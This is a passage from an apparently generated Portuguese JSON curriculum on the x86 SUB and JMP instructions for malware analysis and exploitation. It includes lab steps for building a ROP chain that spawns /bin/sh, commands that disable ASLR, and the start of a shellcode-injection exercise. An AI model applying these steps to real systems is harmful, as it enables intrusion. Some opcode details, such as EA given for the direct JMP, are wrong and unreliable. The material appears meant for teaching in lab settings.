                                "Criptografia: SUB em rotação/chave calculation (ex. XOR chains).",
                                "Debugging: Flags de SUB usadas em breakpoints condicionais.",
                                "Arquitetura de Computadores: Reforça ALU e flags em x86."
                              ],
                              "realWorldApplication": "Em análise de malware, reconhecer SUB permite detectar loops anti-análise (ex. SUB ECX,1; JNZ loop), calcular chaves dinâmicas ou bypass de checks de integridade, acelerando triage em equipes de SOC/DFIR."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.2",
                            "name": "Diferenças de SUB entre 32 e 64 bits",
                            "description": "Estudar extensões de registradores e borrow flag (CF), compilando e comparando código Assembly para 32 e 64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Revisar Instrução SUB e Registradores em Arquitetura x86 32 bits",
                                  "subSteps": [
                                    "Estude a sintaxe da instrução SUB em Assembly x86: SUB destino, fonte (destino = destino - fonte).",
                                    "Identifique registradores principais: EAX, EBX, ECX, EDX, ESP, EBP, ESI, EDI.",
                                    "Analise o impacto nas flags: ZF (zero), SF (sign), OF (overflow), CF (carry/borrow para subtração unsigned).",
                                    "Exemplo: SUB EAX, EBX seta CF se EAX < EBX (unsigned).",
                                    "Pratique com um diagrama dos registradores de 32 bits."
                                  ],
                                  "verification": "Escreva um resumo de 100 palavras explicando como SUB afeta CF em 32 bits e liste os 8 registradores GPR.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Documentação Intel x86 manuals (Vol. 2), editor de texto.",
                                  "tips": "Use diagramas visuais para memorizar registradores e suas funções.",
                                  "learningObjective": "Compreender o funcionamento básico de SUB e flags em 32 bits.",
                                  "commonMistakes": "Confundir CF (unsigned borrow) com SF (signed overflow)."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Extensões de Registradores e SUB em x86-64",
                                  "subSteps": [
                                    "Estude registradores de 64 bits: RAX, RBX, etc., incluindo extensões (RAX contém EAX como bits baixos).",
                                    "Liste novos registradores: R8-R15 (64 bits).",
                                    "Analise SUB em 64 bits: Mesma lógica de flags, mas operandos de 64 bits (CF ainda indica borrow).",
                                    "Compare tamanhos: SUB RAX, RBX vs SUB EAX, EBX (usa partes baixas automaticamente).",
                                    "Verifique herança: Operações em EAX afetam apenas 32 bits baixos de RAX."
                                  ],
                                  "verification": "Desenhe um mapa comparativo de registradores 32 vs 64 bits, destacando extensões.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Documentação AMD64 manuals, ferramenta de visualização como x86 registers diagram.",
                                  "tips": "Lembre-se: 64 bits expande registradores existentes sem quebrar compatibilidade.",
                                  "learningObjective": "Identificar diferenças em registradores e comportamento de SUB em 64 bits.",
                                  "commonMistakes": "Assumir que RAX é completamente independente de EAX; teste em debugger."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Compilar e Inspecionar Código Assembly SUB em 32 bits",
                                  "subSteps": [
                                    "Escreva código NASM simples: subtrair dois valores em EAX/EBX e checar CF com debugger.",
                                    "Compile com: nasm -f elf32 sub32.asm && ld -m elf_i386 sub32.o -o sub32.",
                                    "Execute com GDB: gdb sub32, defina breakpoint após SUB, examine flags com 'info registers'.",
                                    "Teste casos: subtração sem borrow (CF=0) e com borrow (CF=1).",
                                    "Registre saídas de EFLAGS."
                                  ],
                                  "verification": "Capture screenshot ou log de GDB mostrando CF setado corretamente em caso de borrow.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "NASM, LD (32-bit support), GDB, VM com 32-bit compatibilidade (ex: Ubuntu i386).",
                                  "tips": "Use 'x/i $pc' no GDB para ver instrução atual.",
                                  "learningObjective": "Executar e depurar SUB 32 bits, observando borrow flag.",
                                  "commonMistakes": "Esquecer de habilitar 32-bit mode no linker ou usar registradores 64-bit."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compilar e Inspecionar Código Assembly SUB em 64 bits",
                                  "subSteps": [
                                    "Adapte código para 64 bits: Use RAX/RBX, compile com nasm -f elf64 sub64.asm && ld sub64.o -o sub64.",
                                    "Execute com GDB: Examine RAX (64 bits), EAX (32 baixos), e CF.",
                                    "Teste overflow em 64 bits vs 32 bits para comparar CF.",
                                    "Use R8 para demonstrar novo registrador: SUB R8, R9.",
                                    "Compare dumps de registradores com 32 bits."
                                  ],
                                  "verification": "Gere relatório comparativo de flags e registradores pós-SUB em ambos modos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "NASM, LD (64-bit), GDB moderno.",
                                  "tips": "No GDB, 'print /x $rax' para hex; compare com 'print /x $eax'.",
                                  "learningObjective": "Depurar SUB 64 bits e notar extensões de registradores.",
                                  "commonMistakes": "Ignorar que CF é compartilhado; testar apenas valores pequenos."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Comparar Diferenças e Analisar Borrow Flag (CF)",
                                  "subSteps": [
                                    "Compare saídas: Registradores (8 em 32 vs 16 em 64), tamanhos de operandos.",
                                    "Foque em CF: Comportamento idêntico (borrow detect), mas contexto unsigned maior em 64 bits.",
                                    "Teste cenários edge: Subtração que causa borrow em 32 mas não em 64 devido a extensão.",
                                    "Documente tabela: Colunas para 32-bit e 64-bit (registradores usados, flags afetadas).",
                                    "Discuta implicações para análise binária."
                                  ],
                                  "verification": "Crie tabela Markdown ou imagem resumindo 3 diferenças chave.",
                                  "estimatedTime": "25 minutos",
                                  "materials": "Editor de texto, ferramentas de tabela (ex: Excel ou Markdown).",
                                  "tips": "Use diff tool em logs GDB para automação.",
                                  "learningObjective": "Sintetizar diferenças principais de SUB 32 vs 64 bits.",
                                  "commonMistakes": "Subestimar impacto de extensões em análise de binários mistos."
                                }
                              ],
                              "practicalExample": "Escreva programa Assembly que subtrai 0xFFFFFFFF (32-bit max) de 1 em EAX (32 bits: borrow, CF=1) vs RAX (64 bits: sem borrow imediato, CF=0 inicialmente). Compile ambos, depure com GDB e compare EFLAGS/CF.",
                              "finalVerifications": [
                                "Explicar verbalmente 3 diferenças em registradores entre 32 e 64 bits.",
                                "Demonstrar compilação e debug de SUB em ambos modos sem erros.",
                                "Identificar corretamente quando CF é setado em subtração unsigned.",
                                "Listar novos registradores R8-R15 e seu uso em SUB.",
                                "Comparar dumps de registradores de exemplos práticos.",
                                "Discutir por que extensões importam em análise binária."
                              ],
                              "assessmentCriteria": [
                                "Precisão na descrição de borrow flag (CF) em SUB (90%+ correto).",
                                "Número e qualidade de subSteps executados (mínimo 4 por step).",
                                "Correção em compilações 32/64 bits (executáveis sem erros).",
                                "Profundidade da comparação (tabela com ≥3 diferenças claras).",
                                "Uso correto de GDB para verificação de flags.",
                                "Clareza no practicalExample e verificações finais."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender como compilador gera SUB para operações aritméticas.",
                                "Sistemas Operacionais: Diferenças em calling conventions afetam registradores.",
                                "Segurança: Análise de overflows em binários para exploits (buffer overflow detection).",
                                "Engenharia de Software: Reverse engineering de binários cross-plataforma."
                              ],
                              "realWorldApplication": "Em cibersegurança, analistas de malware comparam binários 32/64 bits para detectar packing, obfuscation ou vulnerabilidades como integer underflow em SUB, essencial para desassembly de malwares em ferramentas como IDA Pro ou Ghidra."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.3.3",
                            "name": "Aplicar SUB em análise de fluxo de controle",
                            "description": "Usar SUB em exemplos de ROP (Return-Oriented Programming) para ajustar stacks, analisando binários com ferramentas de reversa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o papel da instrução SUB em ROP e fluxo de controle",
                                  "subSteps": [
                                    "Estude a sintaxe e semântica da instrução SUB em x86/x64: SUB dst, src diminui dst por src e atualiza flags (ZF, CF, OF, SF, AF, PF).",
                                    "Analise como SUB ajusta o stack pointer (RSP/RBP) em gadgets ROP para alinhamento ou correção de offsets em chains.",
                                    "Revise conceitos de ROP: reutilização de código existente para bypass de proteções como DEP/NX.",
                                    "Examine exemplos de fluxos de controle onde SUB influencia branches condicionais via flags.",
                                    "Pratique decodificação manual de instruções SUB em hex dumps."
                                  ],
                                  "verification": "Resuma em um documento como SUB altera RSP em um gadget ROP e liste flags afetadas, com exemplo assembly.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação Intel x86 manuals (volume 2)",
                                    "Site ROP Emporium ou LiveOverflow vídeos sobre ROP"
                                  ],
                                  "tips": "Use um disassembler online como odo para testar SUB rapidamente sem setup.",
                                  "learningObjective": "Identificar usos precisos de SUB em ROP para manipulação de stack e controle de fluxo.",
                                  "commonMistakes": "Confundir SUB com ADD (sinal oposto); ignorar overflow de flags em cálculos de 64 bits."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Configurar ambiente e carregar binário para análise reversa",
                                  "subSteps": [
                                    "Instale ferramentas: Ghidra, radare2 (r2), ROPgadget e pwndbg (GDB com extensões).",
                                    "Baixe ou compile um binário vulnerável simples com buffer overflow (ex: ROP Emporium ret2reg).",
                                    "Carregue o binário no Ghidra ou r2 e gere listing de disassembly.",
                                    "Identifique seções .text e stack layout usando 'checksec' para verificar proteções (NX, ASLR).",
                                    "Execute ROPgadget para listar gadgets disponíveis, filtrando por 'sub'."
                                  ],
                                  "verification": "Confirme lista de gadgets com SUB gerada e visualize em Ghidra sem erros de parsing.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ghidra (gratuito)",
                                    "radare2",
                                    "ROPgadget (pip install ropgadget)",
                                    "Binário de teste ROP Emporium"
                                  ],
                                  "tips": "Use 'r2 -A binary' para análise automática; desative ASLR com 'echo 0 > /proc/sys/kernel/randomize_va_space'.",
                                  "learningObjective": "Preparar ferramentas para análise eficiente de binários em contextos ROP.",
                                  "commonMistakes": "Esquecer de alinhar arquitetura (32/64 bits); instalar ferramentas sem dependências como capstone."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar fluxo de controle usando SUB em gadgets ROP",
                                  "subSteps": [
                                    "Navegue pelo disassembly procurando sequências com SUB RSP/RBP, seguido de RET ou POP.",
                                    "Trace o impacto de SUB no stack: calcule offsets necessários para alinhar payload ROP.",
                                    "Simule execução em GDB/pwndbg: defina breakpoint no overflow e step através do gadget SUB.",
                                    "Analise flags pós-SUB e como afetam jumps próximos no fluxo de controle.",
                                    "Documente 3-5 gadgets SUB úteis com endereços e efeitos no stack."
                                  ],
                                  "verification": "Crie um diagrama de stack before/after SUB em um gadget específico.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "pwndbg (gdb-pwndbg)",
                                    "Ghidra com script de análise ROP",
                                    "Binário vulnerável"
                                  ],
                                  "tips": "Use 'ROPgadget --binary bin --only \"sub|rsp\"' para filtrar; 'vmmap' no pwndbg para ver stack.",
                                  "learningObjective": "Mapear como SUB altera fluxo de controle em ROP chains reais.",
                                  "commonMistakes": "Não considerar endianness em payloads; ignorar padding necessário pós-SUB."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Construir e testar ROP chain com SUB para ajuste de stack",
                                  "subSteps": [
                                    "Planeje chain: [junk] + gadget_SUB_RSP + pop_rdi + system_addr + \"/bin/sh\".",
                                    "Gere payload em Python com pwntools: ajuste offset com SUB para pop correto.",
                                    "Execute exploit local: ./exploit | ./binary e verifique shell spawn.",
                                    "Debug falhas: use 'cyclic' para encontrar offset exato e ajuste com SUB.",
                                    "Itere testando em ambiente com ASLR off/on."
                                  ],
                                  "verification": "Obtenha shell interativa via ROP chain, confirmando SUB ajustou stack corretamente.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "pwntools (pip install pwntools)",
                                    "Binário de teste",
                                    "Python 3"
                                  ],
                                  "tips": "Comece com chains simples; use 'pattern_create' do pwntools para offsets precisos.",
                                  "learningObjective": "Implementar ROP funcional usando SUB para controle preciso de stack.",
                                  "commonMistakes": "Offset incorreto levando a crash; esquecer de alinhar stack a 16 bytes para calls."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Avaliar e refinar a análise ROP com SUB",
                                  "subSteps": [
                                    "Registre métricas: tempo de chain, gadgets usados, impacto de SUB em performance.",
                                    "Teste variações: SUB com diferentes valores para cenários de stack desalinhado.",
                                    "Compare com ferramentas automáticas como ROPchain ou ret-sync.",
                                    "Escreva relatório: explicando papel de SUB no sucesso da exploit.",
                                    "Pratique em outro binário para generalização."
                                  ],
                                  "verification": "Relatório completo com screenshots de GDB mostrando stack ajustado por SUB.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "GDB/pwndbg logs",
                                    "Editor de texto"
                                  ],
                                  "tips": "Salve sessões GDB com 'generate-core-file'; use ret-sync para sync com IDA/Ghidra.",
                                  "learningObjective": "Refinar habilidades de análise e documentação em exploits ROP.",
                                  "commonMistakes": "Sobrestimar robustez da chain sem testes em ASLR; pular documentação."
                                }
                              ],
                              "practicalExample": "Em um binário ret2reg-level2 (ROP Emporium), offset=40. Gadget: 0xdeadbeef: sub rsp, 0x8; pop rdi; ret. Payload: cyclic(40) + p64(0xdeadbeef) + p64(binsh_addr). SUB corrige desalinhamento de 8 bytes pós-pop, permitindo call system(/bin/sh). Teste: python3 exploit.py | ./ret2reg-level2 → $whoami.",
                              "finalVerifications": [
                                "Shell spawnado via ROP chain com SUB ajustando RSP corretamente.",
                                "Flags pós-SUB validadas em GDB (ex: CF=0 para no borrow).",
                                "Stack trace em GDB mostra execução sequencial dos gadgets.",
                                "Exploit funciona com ASLR off e falha explicada com on.",
                                "Diagrama de stack before/after SUB alinhado a 16 bytes.",
                                "Nenhum crash por desalinhamento em múltiplas execuções."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de gadgets SUB (endereços e efeitos corretos).",
                                "Correção matemática do ajuste de stack via SUB (offsets exatos).",
                                "Funcionalidade da ROP chain: shell obtido sem crashes.",
                                "Explicação clara do impacto de flags de SUB no fluxo.",
                                "Eficiência: chain minimalista com 3-5 gadgets.",
                                "Documentação completa com diagramas e código exploit."
                              ],
                              "crossCurricularConnections": [
                                "Análise de Binários: Uso de Ghidra/radare2 para disassembly.",
                                "Assembly Básico: Integração com instruções POP/RET em chains.",
                                "Exploração de Vulnerabilidades: Buffer overflow como vetor de ROP.",
                                "Programação em C: Entendimento de stack frames e calling conventions.",
                                "Sistemas Operacionais: Gerenciamento de memória e proteções (ASLR/DEP)."
                              ],
                              "realWorldApplication": "Em pentesting e bug bounties, ROP com SUB é usado para explorar buffer overflows em serviços reais (ex: CVE-2010-XXXX em servers), ajustando stack para bypass PIE/ASLR e execução de shellcode remoto, comum em CTFs como pwn.college ou competições DEF CON."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.2.4",
                        "name": "Instrução JMP e suas variações",
                        "description": "JMP realiza saltos incondicionais, com variações condicionais como JE, JNE baseadas em flags, cruciais para controle de fluxo em shellcodes e exploração de vulnerabilidades.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.2.4.1",
                            "name": "Sintaxe básica de JMP direto e indireto",
                            "description": "Diferenciar JMP label, JMP reg, JMP [mem] em 32 bits, calculando offsets relativos em código desmontado.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender a sintaxe de JMP direto (JMP label)",
                                  "subSteps": [
                                    "Estude a opcode de JMP direto em 32 bits: EA seguido de endereço absoluto de 32 bits.",
                                    "Identifique exemplos em código assembly: JMP 0x401000.",
                                    "Analise como o endereço é resolvido em runtime para salto incondicional.",
                                    "Compare com CALL para entender diferenças em pilha e fluxo.",
                                    "Pratique escrevendo um snippet simples com JMP label."
                                  ],
                                  "verification": "Escreva e desmonte um código assembly com JMP label usando NASM e objdump, confirmando o opcode EA.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Editor de texto (Vim/Notepad++)",
                                    "NASM assembler",
                                    "objdump ou Ghidra",
                                    "Documentação Intel x86 Manual vol. 2"
                                  ],
                                  "tips": "Sempre verifique o modo de endereçamento: direto usa endereço fixo, ignore relativos por agora.",
                                  "learningObjective": "Diferenciar JMP direto de outras formas e reconhecer sua representação em bytes.",
                                  "commonMistakes": [
                                    "Confundir com JMP relativo (E9)",
                                    "Ignorar little-endian na leitura de bytes",
                                    "Assumir endereço virtual sem contexto de ASLR"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar JMP indireto via registrador (JMP reg)",
                                  "subSteps": [
                                    "Aprenda a sintaxe: FF /4 ou E9 com reg como EAX (opcode FF 25 reg).",
                                    "Examine como o registrador contém o endereço de destino dinamicamente.",
                                    "Monte um exemplo: MOV EAX, 0x401000; JMP EAX.",
                                    "Desmonte com objdump para ver bytes: FF E0 para EAX.",
                                    "Teste em debugger (GDB) para observar salto baseado em valor de reg."
                                  ],
                                  "verification": "Em GDB, defina breakpoint antes de JMP reg, altere reg e confirme salto correto.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "GDB debugger",
                                    "NASM",
                                    "objdump",
                                    "Exemplos de shellcode simples"
                                  ],
                                  "tips": "Use 'x/i $pc' no GDB para inspecionar instrução atual.",
                                  "learningObjective": "Reconhecer quando JMP usa conteúdo de registrador para salto flexível.",
                                  "commonMistakes": [
                                    "Esquecer de inicializar o registrador",
                                    "Confundir com JMP [reg] (memória)",
                                    "Não validar endereço válido antes do salto"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar JMP indireto via memória (JMP [mem])",
                                  "subSteps": [
                                    "Estude sintaxe: JMP [endereço] ou FF 25 para [reg+offset].",
                                    "Exemplo: JMP [0x401000] onde memória em 0x401000 tem endereço alvo.",
                                    "Compare direto vs indireto: memória permite salto baseado em dados.",
                                    "Desmonte binário com JMP [EBX] ou JMP dword ptr [0x12345678].",
                                    "Pratique calculando endereço efetivo em modo protegido 32 bits."
                                  ],
                                  "verification": "Crie assembly com JMP [mem], desmonte e confirme opcode FF 25 seguido de endereço.",
                                  "estimatedTime": "50 minutos",
                                  "materials": [
                                    "NASM",
                                    "objdump",
                                    "GDB",
                                    "Intel x86 Manual"
                                  ],
                                  "tips": "Lembre-se: [mem] dereferencia o endereço, não salta para ele.",
                                  "learningObjective": "Identificar e diferenciar JMP indireto memória de registrador.",
                                  "commonMistakes": [
                                    "Confundir operandos: reg vs [mem]",
                                    "Não alinhar dados em memória",
                                    "Overflow em cálculos de offset"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Calcular offsets relativos em código desmontado",
                                  "subSteps": [
                                    "Revise JMP relativo: opcode E9 + offset signed 32 bits (relativo a IP+5).",
                                    "Em desmontagem, calcule: offset = destino - (IP atual + 5).",
                                    "Pratique com objdump: identifique E9 XX XX XX XX e resolva para label.",
                                    "Use calculadora hex para verificar: ex. E9 FB FF FF FF -> -5 bytes back.",
                                    "Aplique em snippet real: desmonte loop com JMP relativo."
                                  ],
                                  "verification": "Desmonte código com JMPs mistos, calcule 3 offsets manualmente e valide com labels.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "objdump ou IDA Free",
                                    "Calculadora hex (online ou bc)",
                                    "Snippets de assembly com loops"
                                  ],
                                  "tips": "IP = endereço da próxima instrução; some tamanho da JMP (5 bytes).",
                                  "learningObjective": "Calcular e interpretar offsets relativos para reconstruir lógica.",
                                  "commonMistakes": [
                                    "Errar +5 bytes no cálculo de IP",
                                    "Ignorar signed extension",
                                    "Confundir absoluto com relativo"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um binário desmontado de um exploit simples: 0x00401000: EA 00 10 40 00 (JMP direto 0x401000), 0x00401005: FF 25 08 20 40 00 (JMP [0x402008]), 0x0040100B: E9 F0 FF FF FF (JMP relativo -16 bytes). Calcule offsets e identifique fluxos para bypass de shellcode.",
                              "finalVerifications": [
                                "Diferencie corretamente JMP label, JMP reg e JMP [mem] em um snippet desmontado.",
                                "Calcule offset relativo de E9 AB 12 34 56 para endereço destino exato.",
                                "Explique em GDB por que JMP EAX salta baseado em runtime value.",
                                "Identifique opcode EA vs FF 25 em bytes hex dump.",
                                "Reconstrua lógica de um loop simples usando apenas JMPs variados.",
                                "Valide salto memória dereferenciando endereço correto."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de 90% das variantes JMP em desmontagem aleatória.",
                                "Cálculos de offset corretos em 5 exemplos com margens <1 byte erro.",
                                "Explicação clara de diferenças semânticas (direto vs indireto).",
                                "Uso correto de ferramentas (objdump/GDB) sem erros de sintaxe.",
                                "Aplicação em contexto real: análise de shellcode ou ROP chain.",
                                "Evitar confusões comuns como reg vs [mem] em todos os testes."
                              ],
                              "crossCurricularConnections": [
                                "Programação em C: Entender gotos implícitos em ponteiros de função.",
                                "Análise de Malware: Identificar JMPs em shellcode para detecção.",
                                "Engenharia Reversa: Base para ROP gadgets em exploits.",
                                "Arquitetura de Computadores: Fluxo de controle em pipeline x86.",
                                "Segurança de Software: Mitigações como ASLR afetando JMPs indiretos."
                              ],
                              "realWorldApplication": "Em análise de vulnerabilidades, reverse engineers usam isso para mapear fluxos em binários maliciosos, construindo ROP chains (ex: JMP [ESP] em ret2libc) ou debugando crashes em software legado 32 bits."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.4.2",
                            "name": "Variações condicionais em 32 e 64 bits",
                            "description": "Listar JE, JZ, JG etc., comparando tamanhos de saltos (short, near) e RIP-relative em 64 bits.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Entender as Condições das Instruções de Salto Condicional (Jcc)",
                                  "subSteps": [
                                    "Liste as principais instruções Jcc: JE/JZ (salta se ZF=1), JNE/JNZ (ZF=0), JG/JNLE (SF=OF e ZF=0), JLE/JNG (ZF=1 ou SF≠OF), JS (SF=1), JNS (SF=0), JO (OF=1), JNO (OF=0), JC/JB/JNAE (CF=1), JNC/JAE/JNB (CF=0).",
                                    "Estude as flags do EFLAGS afetadas: ZF (Zero Flag), CF (Carry Flag), SF (Sign Flag), OF (Overflow Flag), e combinações como (SF xor OF) para signed comparisons.",
                                    "Crie uma tabela comparativa das condições para jumps signed vs unsigned (ex: JG vs JA).",
                                    "Revise mnemônicos duplicados: JE=JZ, JNE=JNZ, etc., e memorize pelo menos 10 variações principais.",
                                    "Pratique identificando qual Jcc usar para cenários comuns como igualdade, maior que, etc."
                                  ],
                                  "verification": "Crie uma tabela com 10 Jcc e suas condições de flag; verifique se todas estão corretas comparando com documentação oficial Intel.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação Intel x86 Manuals (Vol. 2)",
                                    "Tabela de instruções Jcc online (ex: felixcloutier.com/x86/jcc)"
                                  ],
                                  "tips": "Agrupe por tipo: equality (JE/JNE), signed (JG/JL), unsigned (JA/JB); use flashcards para memorização.",
                                  "learningObjective": "Identificar e explicar a condição de flag para qualquer instrução Jcc comum.",
                                  "commonMistakes": [
                                    "Confundir signed (JG) com unsigned (JA)",
                                    "Esquecer que JE=JZ compartilham opcode mas dependem do contexto",
                                    "Ignorar combinações de flags como (SF xor OF)"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Saltos em x86-32: Short vs Near",
                                  "subSteps": [
                                    "Aprenda encodings: Short Jcc (opcode 70h-7Fh + rel8: offset -128 a +127 bytes), Near Jcc (0F 80h-8Fh + rel32: offset 32-bit signed).",
                                    "Monte exemplos em Assembly: use NASM para codificar 'cmp eax, ebx; je short label; je near label'.",
                                    "Disasseble com objdump ou ndisasm para ver bytes e offsets relativos ao IP (Instruction Pointer).",
                                    "Calcule manualmente o target address: para short, IP_after = IP_start + 2; target = IP_after + rel8.",
                                    "Teste limites: tente salto short >127 bytes para forçar near (assembler otimiza automaticamente)."
                                  ],
                                  "verification": "Escreva e disasseble um código com ambos short/near; confirme offsets e tamanhos de instrução.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "NASM assembler",
                                    "objdump ou Ghidra",
                                    "Exemplos de código Assembly simples"
                                  ],
                                  "tips": "Use 'jmp short' para testar; assemblers preferem short quando possível para otimização de tamanho.",
                                  "learningObjective": "Diferenciar encodings e calcular targets de salto em 32-bit.",
                                  "commonMistakes": [
                                    "Confundir offset relativo com absoluto",
                                    "Esquecer que near é sempre rel32 mesmo em 32-bit",
                                    "Não assinar o rel8/rel32 corretamente"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Diferenças em x86-64: RIP-Relative e Encodings",
                                  "subSteps": [
                                    "Estude encodings em 64-bit: Short (70h-7Fh + rel8), Near (0F 80h-8Fh + rel32); target = RIP + rel32 (RIP = endereço após instrução).",
                                    "Compare com 32-bit: rel32 é signed 32-bit, permitindo ±2GB; sem rel64 para Jcc (use JMP para long).",
                                    "Analise RIP-relative: demonstre com 'cmp rax, rbx; je rel32_target' em disassembly (ex: Ghidra mostra RIP+offset).",
                                    "Teste em código: compile 64-bit com GCC -m64, disasseble para ver Jcc near com offsets grandes.",
                                    "Identifique limitações: short ainda -128/+127; near para distâncias maiores, comum em position-independent code (PIC)."
                                  ],
                                  "verification": "Disasseble um binário 64-bit com Jcc; calcule e confirme 3 targets RIP-relative manualmente.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "GCC com -m64",
                                    "objdump -d",
                                    "Ghidra ou IDA Free para análise estática"
                                  ],
                                  "tips": "Use 'objdump -dM intel' para syntax legível; foque em RIP+0xXXXX no disassembly.",
                                  "learningObjective": "Explicar como RIP-relative afeta cálculos de salto em 64-bit vs 32-bit.",
                                  "commonMistakes": [
                                    "Pensar que 64-bit usa rel64 para Jcc (não, é rel32)",
                                    "Confundir RIP com EIP",
                                    "Ignorar sign extension de rel32 em 64-bit"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Comparar 32-bit vs 64-bit e Praticar Análise",
                                  "subSteps": [
                                    "Crie tabela comparativa: colunas para Jcc, encoding short/near em 32/64, range de salto, RIP-relative (sim/não).",
                                    "Analise binários reais: pegue ELF 32/64-bit, encontre Jcc em funções if/loop, note otimizações.",
                                    "Pratique patching: mude JE para JNE em hex editor e execute em debugger para ver efeito.",
                                    "Simule cenários de segurança: identifique jumps em ROP chains ou anti-debug (timing com jumps).",
                                    "Resolva exercícios: dado opcode bytes, identifique Jcc e compute target."
                                  ],
                                  "verification": "Preencha tabela comparativa com 8 Jcc; analise 2 binários (32 e 64-bit) listando 5 Jcc cada.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "Hex editor (HxD)",
                                    "GDB ou x64dbg",
                                    "Binários de teste (ex: de CTFs)"
                                  ],
                                  "tips": "Comece com código C simples, compile para 32/64 e compare disassembly.",
                                  "learningObjective": "Comparar integralmente variações Jcc entre arquiteturas e aplicar em análise prática.",
                                  "commonMistakes": [
                                    "Não notar que assemblers otimizam short quando possível",
                                    "Confundir mode (16/32/64) afeta encodings",
                                    "Subestimar impacto de ASLR em RIP-relative"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um programa de login: 'cmp eax, expected_pass; je short authenticated; jmp fail;' (32-bit short). Em 64-bit: 'cmp rax, rbx; jne near check_overflow;' (RIP+0x1234), otimizado pelo compiler para PIC executáveis.",
                              "finalVerifications": [
                                "Liste e explique condições de 10 Jcc principais com flags corretas.",
                                "Calcule targets de 3 exemplos short/near em 32 e 64-bit dado disassembly.",
                                "Identifique diferenças chave: ranges de salto e RIP-relative.",
                                "Analise um binário real e anote 5 Jcc com seus encodings.",
                                "Explique por que near é preferido em código moderno PIC.",
                                "Simule erro comum: inverta JE para JNE e descreva mudança no fluxo."
                              ],
                              "assessmentCriteria": [
                                "Precisão nas condições de flags (100% correto para Jcc listadas).",
                                "Correção nos cálculos de offsets RIP-relative (±0 bytes de erro).",
                                "Completude da tabela comparativa (todos tamanhos e diferenças cobertos).",
                                "Qualidade da análise prática (exemplos reais com screenshots de tools).",
                                "Profundidade em cenários de segurança/reverse engineering.",
                                "Clareza na explicação de otimizações assembler/compiler."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Equivalente a 'if' statements em C/loop conditions.",
                                "Segurança Computacional: Análise de binários para exploits (ROP gadgets com Jcc).",
                                "Arquitetura de Computadores: Flags EFLAGS e pipeline effects em branches.",
                                "Compiladores: Otimização de codegen para short/near jumps.",
                                "Sistemas Operacionais: Position-Independent Executables (PIE) e ASLR impacto em RIP."
                              ],
                              "realWorldApplication": "Em reverse engineering de malware, identificar Jcc em checks anti-debug ou validações de senha; em debugging de crashes, analisar mispredicted branches; em otimização de software, reduzir tamanho de código usando short jumps preferencialmente."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.2.4.3",
                            "name": "Implementar JMP em injeção de código",
                            "description": "Criar shellcode com JMP para bypass de controle de fluxo em buffer overflow, testando em ambiente controlado com Metasploit ou manualmente.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar Ambiente de Teste Controlado",
                                  "subSteps": [
                                    "Instalar uma máquina virtual com Linux vulnerável (ex: Ubuntu antigo ou Vulnserver).",
                                    "Compilar uma aplicação C simples com buffer overflow (ex: strcpy sem bounds check).",
                                    "Instalar ferramentas: gdb, objdump, nasm, Metasploit (msfvenom).",
                                    "Configurar ASLR e NX off para testes iniciais (echo 0 > /proc/sys/kernel/randomize_va_space).",
                                    "Criar script para resetar ambiente após crashes."
                                  ],
